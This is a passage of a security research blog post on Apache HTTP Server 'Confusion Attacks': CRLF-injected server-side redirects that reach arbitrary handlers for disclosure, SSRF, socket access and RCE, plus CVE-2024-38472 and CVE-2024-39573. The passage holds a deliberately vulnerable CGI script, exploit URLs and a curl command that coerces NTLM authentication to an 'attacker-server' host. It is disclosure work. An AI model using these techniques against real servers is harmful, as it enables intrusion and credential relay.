        access_status = ap<span>_invoke_handler(<span>new</span>)</span>;                   
    }
    ap<span>_die(<span>access_status</span>, <span>new</span>)</span>;
}
</code></pre><p>Httpd first creates<sup>[1]</sup> a new request structure and copie<sup>[2]</sup> the current <code>r-&gt;content_type</code> into it. After processing<sub>[3]</sub> the lifecycle, it calls<sup>[4]</sup> <code>ap_invoke_handler()</code> ‚Äî the place including the legacy transformation. So, <strong>in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd</strong>. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and here‚Äôs a simple list:</p><ul>
<li>mod_cgi</li>
<li>mod_cgid</li>
<li>mod_wsgi</li>
<li>mod_uwsgi</li>
<li>mod_fastcgi</li>
<li>mod_perl</li>
<li>mod_asis</li>
<li>mod_fcgid</li>
<li>mod_proxy_scgi</li>
<li>‚Ä¶</li>
</ul><p>As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the response‚Äôs <code>Content-Type</code> and part of the <code>Location</code>, here are two scenarios for reference:</p><ol>
<li>CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.</li>
<li>SSRF that can completely control the response headers, such as a project hosted on <code>mod_wsgi</code> like <a href="https://django-revproxy.readthedocs.io/en/latest/" rel="noopener" target="_blank">django-revproxy</a>.</li>
</ol><p>The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:</p><pre><code>
 
<span>use</span> CGI;
<span>my</span> $q = CGI-&gt;new;
<span>my</span> $redir = $q-&gt;param(<span>&#34;r&#34;</span>);
<span>if</span> ($redir =~ <span>m</span>{^https?:<span>//</span>}) {
    <span>print</span> <span>&#34;Location: $redir\n&#34;</span>;
}
<span>print</span> <span>&#34;Content-Type: text/html\n\n&#34;</span>;
</code></pre><h5 id="‚úîÔ∏è-3-2-1-Arbitrary-Handler-to-Information-Disclosure"><a href="#‚úîÔ∏è-3-2-1-Arbitrary-Handler-to-Information-Disclosure" title="‚úîÔ∏è-3-2-1-Arbitrary-Handler-to-Information-Disclosure"><i></i></a>‚úîÔ∏è 3-2-1. Arbitrary Handler to Information Disclosure</h5><p>Starting with invoking an arbitrary handler to disclose information, we use the built-in <code>server-status</code> handler in Apache HTTP Server, which is typically only allowed to be accessed locally:</p><pre><code><span>&lt;Location /server-status&gt;</span>
    <span><span>SetHandler</span></span> server-status
    <span>Require</span> local
<span>&lt;/Location&gt;</span>
</code></pre><p>With the ability to invoke any handler, it becomes possible to overwrite the <code>Content-Type</code> to access sensitive information that should not be accessible remotely:</p><blockquote>
<p><a href="http://server/cgi-bin/redir.cgi?r=http://" rel="noopener" target="_blank">http://server/cgi-bin/redir.cgi?r=http://</a> %0d%0a</p>
</blockquote><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJnjYozC8FskAz1D7mBfaQ7kV-XKsL2ytpgTquDbRZCkmmgY5eSvaAr0ArYrWzFG2f2CZ2t94y37LzX1Pt8jwXdJjl4QWr3sDALYKiOzyoVN5hc9SUhxxDqQGVh6ohmqqarZeVoyQVaa0_g5WaStnEkYsp9kTCij4L465apgbDyM3Ueol41u8oa1OjGQs/s16000/cdfa0bc047573a4162a57c6ee.png"/></p><h5 id="‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts"><a href="#‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts" title="‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts"><i></i></a>‚úîÔ∏è 3-2-2. Arbitrary Handler to Misinterpret Scripts</h5><p>It‚Äôs also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying <code>mod_php</code> to execute embedded malicious code within the image, like:</p><blockquote>
<p><a href="http://server/cgi-bin/redir.cgi?r=http://" rel="noopener" target="_blank">http://server/cgi-bin/redir.cgi?r=http://</a> %0d%0a</p>
</blockquote><h5 id="‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Full-SSRF"><a href="#‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Full-SSRF" title="‚úîÔ∏è-3-2-2-Arbitrary-Handler-to-Full-SSRF"><i></i></a>‚úîÔ∏è 3-2-2. Arbitrary Handler to Full SSRF</h5><p>Calling the <code>mod_proxy</code> to access any protocol on any URL is, of course, straightforward:</p><blockquote>
<p><a href="http://server/cgi-bin/redir.cgi?r=http://" rel="noopener" target="_blank">http://server/cgi-bin/redir.cgi?r=http://</a> %0d%0a</p>
</blockquote><p>Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, <code>mod_proxy</code> automatically adds an <code>X-Forwarded-For</code> header, which gets blocked by EC2 and GCP‚Äôs <a href="https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations" rel="noopener" target="_blank">Metadata protection mechanisms</a>, otherwise, this would be an even more powerful primitive.</p><h5 id="‚úîÔ∏è-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket"><a href="#‚úîÔ∏è-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket" title="‚úîÔ∏è-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket"><i></i></a>‚úîÔ∏è 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</h5><p>However, <code>mod_proxy</code> offers a more ‚Äúconvenient‚Äù feature ‚Äî it can access local Unix Domain Sockets! üòâ</p><p>Here‚Äôs a demonstration accessing PHP-FPM‚Äôs local Unix Domain Socket to execute a PHP backdoor located in <code>/tmp/</code>:</p><blockquote>
<p><a href="http://server/cgi-bin/redir.cgi?r=http://" rel="noopener" target="_blank">http://server/cgi-bin/redir.cgi?r=http://</a> %0d%0a</p>
</blockquote><p>Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP/HTTPS protocols üòè) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.</p><h5 id="‚úîÔ∏è-3-2-4-Arbitrary-Handler-to-RCE"><a href="#‚úîÔ∏è-3-2-4-Arbitrary-Handler-to-RCE" title="‚úîÔ∏è-3-2-4-Arbitrary-Handler-to-RCE"><i></i></a>‚úîÔ∏è 3-2-4. Arbitrary Handler to RCE</h5><p>Finally, let‚Äôs demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official <a href="https://hub.docker.com/_/php" rel="noopener" target="_blank">PHP Docker</a> image includes PEAR, a command-line PHP package management tool, using its <code>Pearcmd.php</code> as an entry point allows us to achieve further exploitation. You can check this article ‚Äî <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" rel="noopener" target="_blank">Docker PHP LFI Summary</a>, written by <a href="https://x.com/phithon_xg" rel="noopener" target="_blank">Phith0n</a> for details!</p><p>Here we utilize a Command Injection within <code>run-tests</code> to complete the entire exploit chain, detailed as follows:</p><blockquote>
<p><a href="http://server/cgi-bin/redir.cgi?r=http://" rel="noopener" target="_blank">http://server/cgi-bin/redir.cgi?r=http://</a> %0d%0a</p>
</blockquote><p>It‚Äôs common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please don‚Äôt forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!</p><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLqJeDGLLBz-JlDJ1UVxKr42My83sJ6y_IUyG2KsVOB9AevfuLcVUKyHR1AFFzlUkzcvpMTusfTPheHWb4u8blEMNvpfv4eraKmdKbIR3jEFS3Ea0uz-zRzxGOpG6uQTZFifRzkEPPtNjtxUyuIkzxr44JyOtzLoeP1MKefi5tle2QnXAKOcT-oOiK0Yo/s16000/cdfa0bc047573a4162a57c6ef.png"/></p><h3 id="üî•-4-Other-Vulnerabilities"><a href="#üî•-4-Other-Vulnerabilities" title="üî•-4-Other-Vulnerabilities"><i></i></a>üî• 4. Other Vulnerabilities</h3><p>While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.</p><h4 id="‚öîÔ∏è-CVE-2024-38472---Windows-UNC-based-SSRF"><a href="#‚öîÔ∏è-CVE-2024-38472---Windows-UNC-based-SSRF" title="‚öîÔ∏è-CVE-2024-38472---Windows-UNC-based-SSRF"><i></i></a>‚öîÔ∏è CVE-2024-38472 - Windows UNC-based SSRF</h4><p>Firstly, the Windows implementation of the <code>apr_filepath_merge()</code> function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:</p><h5 id="‚úîÔ∏è-Triggered-via-HTTP-Request-Parser"><a href="#‚úîÔ∏è-Triggered-via-HTTP-Request-Parser" title="‚úîÔ∏è-Triggered-via-HTTP-Request-Parser"><i></i></a>‚úîÔ∏è Triggered via HTTP Request Parser</h5><p>Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (<code>mod_jk</code>, <code>mod_proxy_ajp</code>) or pairing with <a href="https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes" rel="noopener" target="_blank">PATH_INFO</a>:</p><pre><code><span>AllowEncodedSlashes</span> <span>On</span>
</code></pre><p>Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:</p><pre><code><span>AllowEncodedSlashes</span> <span>On</span>
<span>MergeSlashes</span> <span>Off</span>
</code></pre><p>By using two <code>%5C</code> can force Httpd to coerce NTLM authentication to an <code>attacker-server</code>, and practically, this SSRF can be converted into RCE through <a href="https://en.hackndo.com/ntlm-relay/" rel="noopener" target="_blank">NTLM Relay</a>!</p><pre><code>$ curl http://server/%5C%5Cattacker-server/path/to
</code></pre><p><img alt="" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieUGVbgxqJ6xtJo_DQV150nERC9avF_r7OV0g0zkNTlU2nXJcNbznRa7o3IGSm8aRzGObElsB_zkgMTZ2q7oKSA9_3-vj7_v7xJYRukdig11Hj_JsvAaDYQW2fzisDRgGhkNDOmNoaqjrKwJhTPpUGtWJVrXKYgYx3haZqaOSKfGrNwRDDkJnB2BMiizw/s16000/cdfa0bc047573a4162a57c6f0.png"/></p><h5 id="‚úîÔ∏è-Triggered-via-Type-Map"><a href="#‚úîÔ∏è-Triggered-via-Type-Map" title="‚úîÔ∏è-Triggered-via-Type-Map"><i></i></a>‚úîÔ∏è Triggered via Type-Map</h5><p>In the <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/mods-available/mime.conf/#L235" rel="noopener" target="_blank">Debian/Ubuntu</a> distribution of Httpd, Type-Map is enabled by default:</p><pre><code><span>AddHandler</span> type-map var
</code></pre><p>By uploading a <code>.var</code> file to the server and setting the URI field to a UNC path, you can also force the server to coerce NTLM authentication to the attacker. This is also <a href="https://github.com/orangetw/My-CTF-Web-Challenges?tab=readme-ov-file#ostyle" rel="noopener" target="_blank">the second <code>.var</code> trick</a> I proposed. üòâ</p><h4 id="‚öîÔ∏è-CVE-2024-39573---SSRF-via-Full-Control-of-RewriteRule-Prefix"><a href="#‚öîÔ∏è-CVE-2024-39573---SSRF-via-Full-Control-of-RewriteRule-Prefix" title="‚öîÔ∏è-CVE-2024-39573---SSRF-via-Full-Control-of-RewriteRule-Prefix"><i></i></a>‚öîÔ∏è CVE-2024-39573 - SSRF via Full Control of <code>RewriteRule</code> Prefix</h4><p>Lastly, when you have full control over the prefix of a <code>RewriteRule</code> substitution target in <code>Server Config</code> or <code>VirtualHost</code> is fully controllable, you can invoke <code>mod_proxy</code> and its sub-modules:</p><pre><code><span><span>RewriteRule</span></span> ^/broken(.*) <span>$1</span>
</code></pre><p>Using the following URL can delegate the request to <code>mod_proxy</code> for processing:</p><pre><code>$ curl http://server/brokenproxy:unix:/run/[...]|http://path/to
</code></pre><p>But if administrators have tested the rule properly, they would realize that such rules are impractical. Thus, originally it was reported along with another vulnerability as an exploit chain, but this behavior was also treated as a security boundary fix by the security team. As the patches came out, other researchers applied the same behavior to Windows UNC and obtained another additional CVE.</p><h2 id="Future-Works"><a href="#Future-Works" title="Future-Works"><i></i></a>Future Works</h2><p>Finally, let‚Äôs talk about future works and areas for improvement in this research. Confusion Attacks are still a very promising attack surface, especially since my research focused mainly on just two fields. Unless the Apache HTTP Server undergoes architectural improvements or provides better development standards, I believe we‚Äôll see more ‚Äúconfusions‚Äù in the future!</p><p>So, what other areas could be enhanced? In reality, different Httpd distributions have different configurations, so other Unix-Like systems such as the RHEL series, BSD family, and even applications that utilize Httpd might have more escapable <code>RewriteRule</code>, more powerful local gadgets, and unexpected symbolic jumps. These are all left for those interested to continue exploring.</p><p>Due to time constraints, I was unable to share more real-world cases found and exploited in actual websites, devices, or even open-source projects. However, you can probably imagine ‚Äî the real world is still full of countless unexplored rules, bypassable authentications, and hidden CGIs waiting to be uncovered. How to hunt these techniques worldwide? That‚Äôs your mission!</p><h2 id="Conclusion"><a href="#Conclusion" title="Conclusion"><i></i></a>Conclusion</h2><p>Maintaining an open-source project is truly challenging, especially when trying to balance user convenience with the compatibility of older versions. A slight oversight can lead to the entire system being compromised, such as what happened with Httpd 2.4.49, where a minor change in path processing logic led to the disastrous <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773" rel="noopener" target="_blank">CVE-2021-41773</a>. The entire development process must be carefully built upon a pile of legacy code and technical debt. So, if any Apache HTTP Server developers are reading this: Thank you for your hard work and contributions!</p></div></div>
  </body>
</html>
